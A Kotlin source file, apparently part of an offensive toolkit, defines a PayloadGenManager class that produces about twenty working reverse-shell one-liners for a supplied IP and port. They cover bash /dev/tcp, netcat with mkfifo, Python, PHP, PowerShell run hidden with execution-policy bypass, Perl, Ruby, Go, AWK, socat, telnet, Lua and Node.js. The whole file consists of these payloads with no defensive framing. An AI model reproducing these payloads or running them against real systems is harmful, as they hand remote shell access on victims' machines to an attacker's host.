package xin.ctkqiang.deauthctrl.manager

data class Payload(val name: String, val lang: String, val template: String)

class PayloadGenManager {
    fun generate(ip: String, port: String): List<Payload> = listOf(
        Payload("Bash TCP", "bash", "bash -i >& /dev/tcp/$ip/$port 0>&1"),
        Payload("Bash /dev/tcp", "bash", "exec 5<>/dev/tcp/$ip/$port; cat <&5 | while read line; do \$line 2>&5 >&5; done"),
        Payload("NC Traditional", "nc", "nc -e /bin/sh $ip $port"),
        Payload("NC OpenBSD", "nc", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"),
        Payload("NC Mkfifo", "nc", "mkfifo /tmp/f; nc $ip $port < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f"),
        Payload("Python", "python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"),
        Payload("Python3 sh", "python3", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'"),
        Payload("PHP exec", "php", "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        Payload("PHP system", "php", "php -r '\$sock=fsockopen(\"$ip\",$port);system(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        Payload("PHP /dev/tcp", "php", "php -r '\$s=fsockopen(\"$ip\",$port);\$p=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'"),
        Payload("PowerShell #1", "ps1", "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String ); \$sb2=\$sb + 'PS ' + (pwd).Path + '> ';\$x=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$x,0,\$x.Length);\$s.Flush()}"),
        Payload("PowerShell #2", "ps1", "powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""),
        Payload("Perl", "perl", "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
        Payload("Ruby", "ruby", "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"),
        Payload("Go", "go", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$ip:$port\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/sh.go && go run /tmp/sh.go"),
        Payload("AWK", "awk", "awk 'BEGIN {s = \"/inet/tcp/0/$ip/$port\"; while(1) {do { printf \"> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); }} while(c != \"exit\")}}' /dev/null"),
        Payload("Socat", "socat", "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"),
        Payload("Telnet", "telnet", "TF=\$(mktemp -u); mkfifo \$TF && telnet $ip $port 0<\$TF | /bin/sh 1>\$TF 2>&1; rm \$TF"),
        Payload("Lua", "lua", "lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('$ip',$port);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\""),
        Payload("Node.js", "node", "require('child_process').exec('bash -i >& /dev/tcp/$ip/$port 0>&1')"),
    )
}
